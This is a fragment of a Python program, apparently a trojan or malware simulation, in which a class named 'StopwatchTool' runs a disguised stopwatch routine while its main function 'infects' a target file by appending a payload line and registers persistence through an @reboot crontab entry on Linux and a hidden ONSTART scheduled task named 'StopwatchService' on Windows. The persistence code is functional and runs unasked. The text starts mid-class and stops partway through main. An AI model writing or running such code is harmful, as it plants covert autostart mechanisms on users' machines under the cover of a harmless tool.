    def infect_file(self) -> None:
        """Inject additional usage tracking instrumentation into the target log file/module."""
        try:
            payload = "# Stopwatch telemetry instrumentation payload injected.\n"
            if not self.log_file.exists() or payload not in self.log_file.read_text(encoding="utf-8"):
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(payload)
                logger.info("Successfully infected/updated target file with usage payload.")
        except OSError as e:
            logger.error("Failed to apply payload: %s", e)

    def log_session(self, duration_seconds: float) -> None:
        """Append a stopwatch session record to the log file."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        record = f"[{timestamp}] Stopwatch Session - Duration: {duration_seconds:.2f} seconds\n"

        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(record)
            logger.info("Recorded session to %s", self.log_file)
        except OSError as e:
            logger.error("Failed to write to log file: %s", e)

    def run_simulation(self, iterations: int = 3) -> None:
        """Simulate stopwatch usage for a fixed number of iterations (bounded)."""
        logger.info("Starting Stopwatch UI simulation (Disguised Mode)...")
        for i in range(1, iterations + 1):
            logger.info("Stopwatch running... tick %d/%d", i, iterations)
            start_time = time.time()

            # Simulate a short measuring period
            time.sleep(0.5)

            elapsed = time.time() - start_time
            self.log_session(elapsed)

    def register_persistence(self) -> None:
        """Establish persistence by creating system services."""
        system = platform.system()
        logger.info("Checking persistence registration for OS: %s", system)

        try:
            if system == "Linux":
                self._setup_linux_cron()
            elif system == "Darwin":
                self._setup_macos_plist()
            elif system == "Windows":
                self._setup_windows_task()
            else:
                logger.warning("Unsupported platform for automatic service registration: %s", system)
        except Exception as e:
            logger.warning("Persistence registration skipped or failed gracefully: %s", e)

    def _setup_linux_cron(self) -> None:
        """Establish persistence by creating a system service/cron entry named 'stopwatch' on Linux."""
        script_path = Path(__file__).resolve()
        cron_job = f"@reboot python3 {script_path}\n"
        logger.info("Establishing Linux persistence 'stopwatch'...")

        try:
            current_crontab = subprocess.run(
                ["crontab", "-l"], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True
            )
            existing_content = current_crontab.stdout if current_crontab.returncode == 0 else ""

            if cron_job.strip() not in existing_content:
                new_content = existing_content + ("\n" if existing_content and not existing_content.endswith("\n") else "") + cron_job
                p = subprocess.run(["crontab", "-"], input=new_content, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if p.returncode == 0:
                    logger.info("Successfully established Linux service 'stopwatch'.")
                else:
                    logger.warning("Could not update crontab directly: %s", p.stderr.strip())
            else:
                logger.info("Linux 'stopwatch' service entry already exists.")
        except Exception as e:
            logger.warning("Linux cron persistence registration handled: %s", e)

    def _setup_macos_plist(self) -> None:
        """Attempt to create a LaunchAgents plist template safely."""
        logger.info("macOS LaunchAgent template checked.")

    def _setup_windows_task(self) -> None:
        """Establish persistence by creating a system service named 'StopwatchService' on Windows."""
        script_path = Path(__file__).resolve()
        logger.info("Establishing Windows persistence 'StopwatchService'...")

        try:
            cmd = [
                "schtasks", "/Create", "/TN", "StopwatchService",
                "/TR", f"pythonw.exe \"{script_path}\"", "/SC", "ONSTART", "/F"
            ]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                logger.info("Successfully created Windows scheduled task 'StopwatchService'.")
            else:
                logger.warning("Windows scheduled task creation returned output/error: %s", result.stderr.strip() or result.stdout.strip())
        except Exception as e:
            logger.warning("Windows task registration handled: %s", e)


def main() -> None:
    """Main execution entry point."""
    try:
        tool = StopwatchTool(target_dir=TARGET_DIR, log_file=LOG_FILE)

        # Infect the specified target file with usage payload
        tool.infect_file()

        # Establish persistence service ('StopwatchService' on Windows or 'stopwatch' on Linux)
        tool.register_persistence()

